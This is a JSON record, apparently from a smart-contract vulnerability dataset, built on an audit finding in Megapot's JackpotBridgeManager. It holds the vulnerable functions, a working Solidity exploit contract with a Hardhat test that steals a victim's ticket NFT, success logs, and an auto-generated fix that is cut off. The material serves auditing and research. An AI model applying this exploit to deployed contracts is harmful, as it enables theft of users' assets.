@@ -1,0 +1,171 @@
+{
+  "id": "64140",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/JackpotBridgeManager.sol# L225-L243",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      225,
+      243
+    ],
+    [
+      345,
+      362
+    ]
+  ],
+  "filename": "64140_JackpotBridgeManager.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 371,
+  "vulnerability_title": "[H-01] Attacker can steal `JackpotTicketNFT`\u2019s from `JackpotBridgeManager.sol`",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "Validate `RelayTxData` before performing the external call or perform external call only on whitelisted addresses.\n\nExpand for detailed Proof of Concept",
+    "fix_code_blocks": []
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "Place this contract inside the `2025-11-megapot/contracts` and name it `Exploit.sol`\n\n`ExploitContract :`\n```\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\ncontract Exploit is IERC721Receiver {\n  address public jackpotBridgeManager;\n  address public token;\n\n  constructor(address _jackpotBridgeManager, address _token) {\n    jackpotBridgeManager = _jackpotBridgeManager;\n    token = _token;\n  }\n\n  // Function to receive ERC721 tokens\n  function onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n  ) external override returns (bytes4) {\n    // Pull ERC20 tokens from jackpotBridgeManager based on allowance\n    IERC20 erc20Token = IERC20(token);\n    uint256 allowance = erc20Token.allowance(\n      jackpotBridgeManager,\n      address(this)\n    );\n    if (allowance > 0) {\n      require(\n        erc20Token.transferFrom(jackpotBridgeManager, address(this), allowance),\n        \"Transfer failed\"\n      );\n    }\n\n    // Return the correct selector to confirm ERC721 acceptance\n    return IERC721Receiver.onERC721Received.selector;\n  }\n\n  // Rescue function for ERC20 tokens\n  function rescueERC20(address _token, address _to, uint256 _amount) external {\n    require(_to != address(0), \"Invalid address\");\n    IERC20(_token).transfer(_to, _amount);\n  }\n\n  // Rescue function for ERC721 tokens\n  function rescueERC721(\n    address _token,\n    address _to,\n    uint256 _tokenId\n  ) external {\n    require(_to != address(0), \"Invalid address\");\n    IERC721(_token).safeTransferFrom(address(this), _to, _tokenId);\n  }\n\n  function tokenAddress() external view returns (address) {\n    return token;\n  }\n\n  // Fallback to receive ETH if needed\n  receive() external payable {}\n\n  function safeTransferFrom(\n    address from,\n    address to,\n    uint256 id,\n    bytes calldata data\n  ) public payable virtual {}\n}\n```\n\nPaste this in `C4PoC.spec.ts` and run\n```\n\nyarn test --grep \"demonstrates the C4 submission's validity\"\n```\n\n`POC :`\n```\n\nimport { ethers } from \"hardhat\";\nimport { getWaffleExpect, getAccounts } from \"@utils/test/index\";\nimport { ether, usdc } from \"@utils/common\";\nimport { Account } from \"@utils/test\";\n\nimport {\n  Jackpot,\n  JackpotBridgeManager,\n  JackpotTicketNFT,\n  ScaledEntropyProviderMock,\n  ReentrantUSDCMock,\n  GuaranteedMinimumPayoutCalculator,\n  JackpotLPManager,\n} from \"@utils/contracts\";\n\nimport {\n  JackpotSystemFixture,\n  RelayTxData,\n  Ticket,\n} from \"@utils/types\";\n\nimport { deployJackpotSystem } from \"@utils/test/jackpotFixture\";\nimport {\n  generateClaimWinningsSignature,\n} from \"@utils/protocolUtils\";\n\nimport { takeSnapshot, SnapshotRestorer, time } from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nconst expect = getWaffleExpect();\n\ndescribe.only(\"PoC\", () => {\n  let owner: Account;\n  let attacker: Account;\n  let victim: Account;\n  let jackpotSystem: JackpotSystemFixture;\n  let jackpot: Jackpot;\n  let jackpotNFT: JackpotTicketNFT;\n  let jackpotBridgeManager: JackpotBridgeManager;\n  let usdcMock: ReentrantUSDCMock;\n  let entropyProvider: ScaledEntropyProviderMock;\n  let payoutCalculator: GuaranteedMinimumPayoutCalculator;\n  let jackpotLPManager: JackpotLPManager;\n  let snapshot: SnapshotRestorer;\n\n  beforeEach(async () => {\n    // Retrieve necessary test accounts\n    [owner, attacker, victim] = await getAccounts();\n\n    // Deploy full Jackpot system fixture\n    jackpotSystem = await deployJackpotSystem();\n    jackpot = jackpotSystem.jackpot;\n    jackpotNFT = jackpotSystem.jackpotNFT;\n    jackpotBridgeManager = await jackpotSystem.deployer.deployJackpotBridgeManager(\n      await jackpot.getAddress(),\n      await jackpotNFT.getAddress(),\n      await jackpotSystem.usdcMock.getAddress(),\n      \"MegapotBridgeManager\",\n      \"1.0.0\"\n    );\n    usdcMock = jackpotSystem.usdcMock;\n    entropyProvider = jackpotSystem.entropyProvider;\n    payoutCalculator = jackpotSystem.payoutCalculator;\n    jackpotLPManager = jackpotSystem.jackpotLPManager;\n\n    // Initialize jackpot and deposit LP funds\n    await jackpot.connect(owner.wallet).initialize(\n      usdcMock.getAddress(),\n      await jackpotLPManager.getAddress(),\n      await jackpotNFT.getAddress(),\n      entropyProvider.getAddress(),\n      await payoutCalculator.getAddress()\n    );\n    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10_000_000));\n    await usdcMock.connect(owner.wallet).approve(jackpot.getAddress(), usdc(1_000_000));\n    await jackpot.connect(owner.wallet).lpDeposit(usdc(1_000_000));\n    await jackpot.connect(owner.wallet).initializeJackpot((await time.latest()) + 60 * 60 * 24); // 24hr drawing window\n\n    // Take blockchain snapshot for easy reset before each test\n    snapshot = await takeSnapshot();\n  });\n\n  beforeEach(async () => {\n    await snapshot.restore();\n  });\n\n  it(\"demonstrates the C4 submission's validity\", async () => {\n    console.log(\"Starting Exploit PoC...\");\n\n    // Fund attacker with USDC and approve JackpotBridgeManager\n    await usdcMock.connect(owner.wallet).transfer(attacker.address, usdc(1_000));\n    await usdcMock.connect(attacker.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));\n\n    // Attacker purchases two ticket NFTs\n    const attackerTickets: Ticket[] = [\n      { normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)], bonusball: BigInt(1) },\n      { normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(9), BigInt(10)], bonusball: BigInt(2) },\n    ];\n    await jackpotBridgeManager.connect(attacker.wallet).buyTickets(\n      attackerTickets,\n      attacker.address,\n      [], // No referrers for simplicity\n      [],\n      ethers.encodeBytes32String(\"attackerSource\")\n    );\n\n    // Fund victim with USDC and approve JackpotBridgeManager\n    await usdcMock.connect(owner.wallet).transfer(victim.address, usdc(1_000));\n    await usdcMock.connect(victim.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));\n\n    // Victim purchases two ticket NFTs\n    const victimTickets: Ticket[] = [\n      { normals: [BigInt(11), BigInt(12), BigInt(13), BigInt(14), BigInt(15)], bonusball: BigInt(1) },\n      { normals: [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)], bonusball: BigInt(2) },\n    ];\n    await jackpotBridgeManager.connect(victim.wallet).buyTickets(\n      victimTickets,\n      victim.address,\n      [], // No referrers\n      [],\n      ethers.encodeBytes32String(\"victimSource\")\n    );\n\n    // Fast forward to after drawing period\n    const drawingState = await jackpot.getDrawingState(1);\n    await time.increaseTo(drawingState.drawingTime + BigInt(1));\n\n    // Run jackpot draw and simulate randomness callback\n    await jackpot.connect(owner.wallet).runJackpot({ value: ethers.parseEther(\"1\") });\n    await entropyProvider.randomnessCallback([\n      [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)],\n      [BigInt(2)],\n    ]);\n\n    console.log(\"Tickets have been purchased and jackpot drawn.\");\n\n    // Retrieve attacker and victim ticket IDs from JackpotBridgeManager\n    const attackerTicketIds = await jackpotBridgeManager.getUserTickets(attacker.address, 1);\n    const victimTicketIds = await jackpotBridgeManager.getUserTickets(victim.address, 1);\n\n    console.log(`Attacker Ticket IDs: ${attackerTicketIds.map(id => id.toString()).join(\", \")}`);\n    console.log(`Victim Ticket IDs: ${victimTicketIds.map(id => id.toString()).join(\", \")}`);\n\n    // Deploy the malicious Exploit contract controlled by attacker\n    const ExploitFactory = await ethers.getContractFactory(\"Exploit\");\n    const exploit = await ExploitFactory.deploy(jackpotBridgeManager.getAddress(), usdcMock.getAddress());\n    await exploit.waitForDeployment();\n    console.log(`Exploit contract deployed at: ${await exploit.getAddress()}`);\n\n    // Check and log who owns victim's NFT before exploit\n    const victimNFTOwnerBefore = await jackpotNFT.ownerOf(victimTicketIds[1]);\n    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner before exploit: ${victimNFTOwnerBefore}`);\n    expect(victimNFTOwnerBefore).to.equal(await jackpotBridgeManager.getAddress());\n\n    // Prepare RelayTxData with malicious safeTransferFrom call targeting victim's NFT\n    const maliciousBridgeDetails: RelayTxData = {\n      approveTo: await exploit.getAddress(),\n      to: await jackpotNFT.getAddress(),\n      data: ExploitFactory.interface.encodeFunctionData(\"safeTransferFrom\", [\n        await jackpotBridgeManager.getAddress(),\n        await exploit.getAddress(),\n        victimTicketIds[1], // Victim's NFT token ID\n        \"0x\",\n      ]),\n    };\n\nlet attackersTicketIdsArray: bigint[] = [];\n    attackersTicketIdsArray.push(attackerTicketIds[0]);\n    attackersTicketIdsArray.push(attackerTicketIds[1]);\n\n// Prepare signature for claimWinnings with attacker ticket IDs and malicious payload\n    const claimSignature = await generateClaimWinningsSignature(\n      await jackpotBridgeManager.getAddress(),\n      attackersTicketIdsArray,\n      maliciousBridgeDetails,\n      attacker.wallet\n    );\n\n    // Attacker executes the malicious claimWinnings call to steal victim's NFT\n    await jackpotBridgeManager.connect(attacker.wallet).claimWinnings(\n      attackersTicketIdsArray,\n      maliciousBridgeDetails,\n      claimSignature\n    );\n\n    // Check and log the owner of victim's NFT after exploit\n    const victimNFTOwnerAfter = await jackpotNFT.ownerOf(victimTicketIds[1]);\n    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner after exploit: ${victimNFTOwnerAfter}`);\n    expect(victimNFTOwnerAfter).to.equal(await exploit.getAddress());\n\n    console.log(\"Exploit successful: Victim's NFT has been transferred to attacker-controlled contract.\");\n  });\n});\n```\n\n`Logs :`\n```\n\n$ hardhat test --grep 'demonstrates the C4 submission'\\''s validity'\n\nPoC\nStarting Exploit PoC...\nTickets have been purchased and jackpot drawn.\nAttacker Ticket IDs: 30083767223809672004471377353616219992240262417604370218993016052021235661798, 38671522753779678852729165039051710713305298646011436960524446838460091584105\nVictim Ticket IDs: 97081606848453597251411855136975184935661802060911520663759427091658643779747, 104813746921659704743262162214761331873120870227460325112138655077773912896606\nExploit contract deployed at: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c\nVictim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner before exploit: 0x8A791620dd6260079BF849Dc5567aDC3F2FdC318\nVictim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner after exploit: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c\nExploit successful: Victim's NFT has been transferred to attacker-controlled contract.\n    \u2714 demonstrates the C4 submission's validity (345ms)\n\n1 passing (471ms)\n```\n\n---",
+    "poc_code_blocks": [
+      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\ncontract Exploit is IERC721Receiver {\n  address public jackpotBridgeManager;\n  address public token;\n\n  constructor(address _jackpotBridgeManager, address _token) {\n    jackpotBridgeManager = _jackpotBridgeManager;\n    token = _token;\n  }\n\n  // Function to receive ERC721 tokens\n  function onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n  ) external override returns (bytes4) {\n    // Pull ERC20 tokens from jackpotBridgeManager based on allowance\n    IERC20 erc20Token = IERC20(token);\n    uint256 allowance = erc20Token.allowance(\n      jackpotBridgeManager,\n      address(this)\n    );\n    if (allowance > 0) {\n      require(\n        erc20Token.transferFrom(jackpotBridgeManager, address(this), allowance),\n        \"Transfer failed\"\n      );\n    }\n\n    // Return the correct selector to confirm ERC721 acceptance\n    return IERC721Receiver.onERC721Received.selector;\n  }\n\n  // Rescue function for ERC20 tokens\n  function rescueERC20(address _token, address _to, uint256 _amount) external {\n    require(_to != address(0), \"Invalid address\");\n    IERC20(_token).transfer(_to, _amount);\n  }\n\n  // Rescue function for ERC721 tokens\n  function rescueERC721(\n    address _token,\n    address _to,\n    uint256 _tokenId\n  ) external {\n    require(_to != address(0), \"Invalid address\");\n    IERC721(_token).safeTransferFrom(address(this), _to, _tokenId);\n  }\n\n  function tokenAddress() external view returns (address) {\n    return token;\n  }\n\n  // Fallback to receive ETH if needed\n  receive() external payable {}\n\n  function safeTransferFrom(\n    address from,\n    address to,\n    uint256 id,\n    bytes calldata data\n  ) public payable virtual {}\n}",
+      "yarn test --grep \"demonstrates the C4 submission's validity\"",
+      "import { ethers } from \"hardhat\";\nimport { getWaffleExpect, getAccounts } from \"@utils/test/index\";\nimport { ether, usdc } from \"@utils/common\";\nimport { Account } from \"@utils/test\";\n\nimport {\n  Jackpot,\n  JackpotBridgeManager,\n  JackpotTicketNFT,\n  ScaledEntropyProviderMock,\n  ReentrantUSDCMock,\n  GuaranteedMinimumPayoutCalculator,\n  JackpotLPManager,\n} from \"@utils/contracts\";\n\nimport {\n  JackpotSystemFixture,\n  RelayTxData,\n  Ticket,\n} from \"@utils/types\";\n\nimport { deployJackpotSystem } from \"@utils/test/jackpotFixture\";\nimport {\n  generateClaimWinningsSignature,\n} from \"@utils/protocolUtils\";\n\nimport { takeSnapshot, SnapshotRestorer, time } from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nconst expect = getWaffleExpect();\n\ndescribe.only(\"PoC\", () => {\n  let owner: Account;\n  let attacker: Account;\n  let victim: Account;\n  let jackpotSystem: JackpotSystemFixture;\n  let jackpot: Jackpot;\n  let jackpotNFT: JackpotTicketNFT;\n  let jackpotBridgeManager: JackpotBridgeManager;\n  let usdcMock: ReentrantUSDCMock;\n  let entropyProvider: ScaledEntropyProviderMock;\n  let payoutCalculator: GuaranteedMinimumPayoutCalculator;\n  let jackpotLPManager: JackpotLPManager;\n  let snapshot: SnapshotRestorer;\n\n  beforeEach(async () => {\n    // Retrieve necessary test accounts\n    [owner, attacker, victim] = await getAccounts();\n\n    // Deploy full Jackpot system fixture\n    jackpotSystem = await deployJackpotSystem();\n    jackpot = jackpotSystem.jackpot;\n    jackpotNFT = jackpotSystem.jackpotNFT;\n    jackpotBridgeManager = await jackpotSystem.deployer.deployJackpotBridgeManager(\n      await jackpot.getAddress(),\n      await jackpotNFT.getAddress(),\n      await jackpotSystem.usdcMock.getAddress(),\n      \"MegapotBridgeManager\",\n      \"1.0.0\"\n    );\n    usdcMock = jackpotSystem.usdcMock;\n    entropyProvider = jackpotSystem.entropyProvider;\n    payoutCalculator = jackpotSystem.payoutCalculator;\n    jackpotLPManager = jackpotSystem.jackpotLPManager;\n\n    // Initialize jackpot and deposit LP funds\n    await jackpot.connect(owner.wallet).initialize(\n      usdcMock.getAddress(),\n      await jackpotLPManager.getAddress(),\n      await jackpotNFT.getAddress(),\n      entropyProvider.getAddress(),\n      await payoutCalculator.getAddress()\n    );\n    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10_000_000));\n    await usdcMock.connect(owner.wallet).approve(jackpot.getAddress(), usdc(1_000_000));\n    await jackpot.connect(owner.wallet).lpDeposit(usdc(1_000_000));\n    await jackpot.connect(owner.wallet).initializeJackpot((await time.latest()) + 60 * 60 * 24); // 24hr drawing window\n\n    // Take blockchain snapshot for easy reset before each test\n    snapshot = await takeSnapshot();\n  });\n\n  beforeEach(async () => {\n    await snapshot.restore();\n  });\n\n  it(\"demonstrates the C4 submission's validity\", async () => {\n    console.log(\"Starting Exploit PoC...\");\n\n    // Fund attacker with USDC and approve JackpotBridgeManager\n    await usdcMock.connect(owner.wallet).transfer(attacker.address, usdc(1_000));\n    await usdcMock.connect(attacker.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));\n\n    // Attacker purchases two ticket NFTs\n    const attackerTickets: Ticket[] = [\n      { normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)], bonusball: BigInt(1) },\n      { normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(9), BigInt(10)], bonusball: BigInt(2) },\n    ];\n    await jackpotBridgeManager.connect(attacker.wallet).buyTickets(\n      attackerTickets,\n      attacker.address,\n      [], // No referrers for simplicity\n      [],\n      ethers.encodeBytes32String(\"attackerSource\")\n    );\n\n    // Fund victim with USDC and approve JackpotBridgeManager\n    await usdcMock.connect(owner.wallet).transfer(victim.address, usdc(1_000));\n    await usdcMock.connect(victim.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));\n\n    // Victim purchases two ticket NFTs\n    const victimTickets: Ticket[] = [\n      { normals: [BigInt(11), BigInt(12), BigInt(13), BigInt(14), BigInt(15)], bonusball: BigInt(1) },\n      { normals: [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)], bonusball: BigInt(2) },\n    ];\n    await jackpotBridgeManager.connect(victim.wallet).buyTickets(\n      victimTickets,\n      victim.address,\n      [], // No referrers\n      [],\n      ethers.encodeBytes32String(\"victimSource\")\n    );\n\n    // Fast forward to after drawing period\n    const drawingState = await jackpot.getDrawingState(1);\n    await time.increaseTo(drawingState.drawingTime + BigInt(1));\n\n    // Run jackpot draw and simulate randomness callback\n    await jackpot.connect(owner.wallet).runJackpot({ value: ethers.parseEther(\"1\") });\n    await entropyProvider.randomnessCallback([\n      [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)],\n      [BigInt(2)],\n    ]);\n\n    console.log(\"Tickets have been purchased and jackpot drawn.\");\n\n    // Retrieve attacker and victim ticket IDs from JackpotBridgeManager\n    const attackerTicketIds = await jackpotBridgeManager.getUserTickets(attacker.address, 1);\n    const victimTicketIds = await jackpotBridgeManager.getUserTickets(victim.address, 1);\n\n    console.log(`Attacker Ticket IDs: ${attackerTicketIds.map(id => id.toString()).join(\", \")}`);\n    console.log(`Victim Ticket IDs: ${victimTicketIds.map(id => id.toString()).join(\", \")}`);\n\n    // Deploy the malicious Exploit contract controlled by attacker\n    const ExploitFactory = await ethers.getContractFactory(\"Exploit\");\n    const exploit = await ExploitFactory.deploy(jackpotBridgeManager.getAddress(), usdcMock.getAddress());\n    await exploit.waitForDeployment();\n    console.log(`Exploit contract deployed at: ${await exploit.getAddress()}`);\n\n    // Check and log who owns victim's NFT before exploit\n    const victimNFTOwnerBefore = await jackpotNFT.ownerOf(victimTicketIds[1]);\n    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner before exploit: ${victimNFTOwnerBefore}`);\n    expect(victimNFTOwnerBefore).to.equal(await jackpotBridgeManager.getAddress());\n\n    // Prepare RelayTxData with malicious safeTransferFrom call targeting victim's NFT\n    const maliciousBridgeDetails: RelayTxData = {\n      approveTo: await exploit.getAddress(),\n      to: await jackpotNFT.getAddress(),\n      data: ExploitFactory.interface.encodeFunctionData(\"safeTransferFrom\", [\n        await jackpotBridgeManager.getAddress(),\n        await exploit.getAddress(),\n        victimTicketIds[1], // Victim's NFT token ID\n        \"0x\",\n      ]),\n    };\n\nlet attackersTicketIdsArray: bigint[] = [];\n    attackersTicketIdsArray.push(attackerTicketIds[0]);\n    attackersTicketIdsArray.push(attackerTicketIds[1]);\n\n// Prepare signature for claimWinnings with attacker ticket IDs and malicious payload\n    const claimSignature = await generateClaimWinningsSignature(\n      await jackpotBridgeManager.getAddress(),\n      attackersTicketIdsArray,\n      maliciousBridgeDetails,\n      attacker.wallet\n    );\n\n    // Attacker executes the malicious claimWinnings call to steal victim's NFT\n    await jackpotBridgeManager.connect(attacker.wallet).claimWinnings(\n      attackersTicketIdsArray,\n      maliciousBridgeDetails,\n      claimSignature\n    );\n\n    // Check and log the owner of victim's NFT after exploit\n    const victimNFTOwnerAfter = await jackpotNFT.ownerOf(victimTicketIds[1]);\n    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner after exploit: ${victimNFTOwnerAfter}`);\n    expect(victimNFTOwnerAfter).to.equal(await exploit.getAddress());\n\n    console.log(\"Exploit successful: Victim's NFT has been transferred to attacker-controlled contract.\");\n  });\n});",
+      "$ hardhat test --grep 'demonstrates the C4 submission'\\''s validity'\n\nPoC\nStarting Exploit PoC...\nTickets have been purchased and jackpot drawn.\nAttacker Ticket IDs: 30083767223809672004471377353616219992240262417604370218993016052021235661798, 38671522753779678852729165039051710713305298646011436960524446838460091584105\nVictim Ticket IDs: 97081606848453597251411855136975184935661802060911520663759427091658643779747, 104813746921659704743262162214761331873120870227460325112138655077773912896606\nExploit contract deployed at: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c\nVictim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner before exploit: 0x8A791620dd6260079BF849Dc5567aDC3F2FdC318\nVictim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner after exploit: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c\nExploit successful: Victim's NFT has been transferred to attacker-controlled contract.\n    \u2714 demonstrates the C4 submission's validity (345ms)\n\n1 passing (471ms)"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "claimWinnings",
+        "start_line": 225,
+        "end_line": 243,
+        "code": "    function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature) external nonReentrant {\n        if (_userTicketIds.length == 0) revert JackpotErrors.NoTicketsToClaim();\n\n        bytes32 eipHash = createClaimWinningsEIP712Hash(_userTicketIds, _bridgeDetails);\n        address signer = ECDSA.recover(eipHash, _signature);\n\n        _validateTicketOwnership(_userTicketIds, signer);\n\n        uint256 preUSDCBalance = usdc.balanceOf(address(this));\n        jackpot.claimWinnings(_userTicketIds);\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n        uint256 claimedAmount = postUSDCBalance - preUSDCBalance;\n\n        if (claimedAmount == 0) revert InvalidClaimedAmount();\n\n        _bridgeFunds(_bridgeDetails, claimedAmount);\n\n        emit WinningsClaimed(signer, _bridgeDetails.to, _userTicketIds, claimedAmount);\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            225,
+            243
+          ]
+        ]
+      },
+      {
+        "function_name": "_bridgeFunds",
+        "start_line": 344,
+        "end_line": 362,
+        "code": "\n    function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {\n        // Approval address is determined off-chain based on whether depository or approvalProxy is being used\n        // If the route requires a direct transfer to a solver the approval address will be 0 and we will\n        // skip approval.\n        if (_bridgeDetails.approveTo != address(0)) {\n            usdc.approve(_bridgeDetails.approveTo, _claimedAmount);\n        }\n\n        uint256 preUSDCBalance = usdc.balanceOf(address(this));\n        (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);\n\n        if (!success) revert BridgeFundsFailed();\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n\n        if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();\n    \n        emit FundsBridged(_bridgeDetails.to, _claimedAmount);\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            345,
+            362
+          ]
+        ]
+      }
+    ]
+  },
+  "extraction_date": "2026-04-16T17:55:26.919936",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the vulnerability related to the unsafe external call pattern in the `_bridgeFunds` function, which allows an attacker to manipulate contract state and steal NFTs.",
+      "content_reasoning": "The content mentions the relevant functions (`claimWinnings` and `_bridgeFunds`) and describes the vulnerability accurately, including the exploitation scenario.",
+      "functions_found": [
+        "claimWinnings",
+        "_bridgeFunds"
+      ],
+      "variables_found": [
+        "_userTicketIds",
+        "_bridgeDetails",
+        "_claimedAmount"
+      ],
+      "patterns_found": [
+        "unsafe external call",
+        "manipulation of contract state"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": null,
+      "confidence": 90,
+      "reasoning": "There is currently no tag assigned to the report, which is not appropriate given the nature of the vulnerability.",
+      "suggested_tag": "NFT Theft",
+      "alternative_tags": [
+        "Cross-Chain Exploit",
+        "External Call Vulnerability"
+      ],
+      "correction_explanation": "A tag is necessary to categorize the vulnerability effectively, and 'NFT Theft' accurately reflects the issue described."
+    },
+    "mando_classification": {
+      "primary_category": "unchecked_low_level_calls",
+      "secondary_categories": [
+        "reentrancy"
+      ],
+      "confidence": 90,
+      "mando_applicable": true,
+      "reasoning": "The vulnerability involves an unsafe external call that allows for manipulation of contract state, fitting the 'unchecked low level calls' category. Additionally, the reentrancy aspect is relevant due to the external call before state updates."
+    },
+    "scsvs_classification": {
+      "primary_category": "I4",
+      "primary_category_name": "Cross-Chain",
+      "secondary_categories": [
+        "C6",
+        "G4"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "The SCSVS categories provide a more granular classification, particularly with the integration aspect of cross-chain vulnerabilities. The business logic and NFT components are also relevant.",
+      "vulnerability_type": "Unsafe external call leading to NFT theft"
+    },
+    "generated_fix": {
+      "has_fix": true,
+      "fix_approach": "Validate RelayTxData and restrict external calls to whitelisted addresses to prevent unauthorized access.",
+      "fixed_code_blocks": [
+        {
+          "snippet_index": 1,
+          "function_name": "claimWinnings",
+          "fixed_function_code": "function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature) external nonReentrant {\n        if (_userTicketIds.length == 0) revert JackpotErrors.NoTicketsToClaim();\n\n        bytes32 eipHash = createClaimWinningsEIP712Hash(_userTicketIds, _bridgeDetails);\n        address signer = ECDSA.recover(eipHash, _signature);\n\n        _validateTicketOwnership(_userTicketIds, signer);\n\n        uint256 preUSDCBalance = usdc.balanceOf(address(this));\n        jackpot.claimWinnings(_userTicketIds);\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n        uint256 claimedAmount = postUSDCBalance - preUSDCBalance;\n\n        if (claimedAmount == 0) revert InvalidClaimedAmount();\n\n        // Validate RelayTxData before bridging funds\n        require(isWhitelisted(_bridgeDetails.to), \"Invalid recipient address\");\n        _bridgeFunds(_bridgeDetails, claimedAmount);\n\n        emit WinningsClaimed(signer, _bridgeDetails.to, _userTicketIds, claimedAmount);\n    }",
+          "reasoning": "This function now includes a check to ensure that the recipient address in RelayTxData is whitelisted, preventing unauthorized external calls."
+        },
+        {
+          "snippet_index": 2,
+          "function_name": "_bridgeFunds",
+          "fixed_function_code": "function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {\n        if (_bridgeDetails.approveTo != address(0)) {\n            usdc.approve(_bridgeDetails.approveTo, _claimedAmount);\n        }\n\n        uint256 preUSDCBalance = usdc.balanceOf(address(this));\n        // Use call with caution and validate the target address\n        require(isWhitelisted(_bridgeDetails.to), \"Invalid recipient address\");\n        (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);\n\n        if (!success) revert BridgeFundsFailed();\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n\n        if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();\n\n        emit FundsBridged(_bridgeDetails.to, _claimedAmount);\n    }",
+          "reasoning": "This function now includes a check to ensure that the recipient address is whitelisted before making the external call, mitigating the risk of unauthorized access."
+        }
+      ],
+      "key_changes": [
+        "Added validation for RelayTxData recipient address to ensure it is whitelisted.",
+        "Included checks before external calls to prevent unauthorized access.",
+        "Ensured that the contract state cannot be manipulated by untrusted external calls."
+      ],
+      "security_improvements": [
+        "Reduced risk of NFT theft by validating external call targets.",
+        "Enhanced overall contract security by implementing whitelisting."
+      ],
+      "additional_recommendations": "Consider implementing a more robust access control mechanism and regularly audit the list of whitelisted addresses.",
+      "confidence": 95,
+      "fix_code": "function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails, bytes memory _signature) external nonReentrant {\n        if (_userTicketIds.length == 0) revert JackpotErrors.NoTicketsToClaim();\n\n        bytes32 eipHash = createClaimWinningsEIP712Hash(_userTicketIds, _bridgeDetails);\n        address signer = ECDSA.recover(eipHash, _signature);\n\n        _validateTicketOwnership(_userTicketIds, signer);\n\n        uint256 preUSDCBalance = usdc.balanceOf(address(this));\n        jackpot.claimWinnings(_userTicketIds);\n        uint256 postUSDCBalance = usdc.balanceOf(address(this));\n        uint256 claimedAmount = postUSDCBalance - preUSDCBalance;\n\n        if (claimedAmount == 0) revert InvalidClaimedAmount();\n\n        // Validate RelayTxData before bridging funds\n        require(isWhitelisted(_bridgeDetails.to), \"Invalid recipient address\");\n        _bridgeFunds(_bridgeDetails, claimedAmount);\n\n        emit WinningsClaimed(signer, _bridgeDetails.to, _userTicketIds, claimedAmount);\n    }\n\nfunction _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {\n        if (_bridgeDetails.approveTo != address(0)) {\n            usdc.approve(_bridgeDetails.approveTo, _claimedAmount);\n        }\n\n        uint256 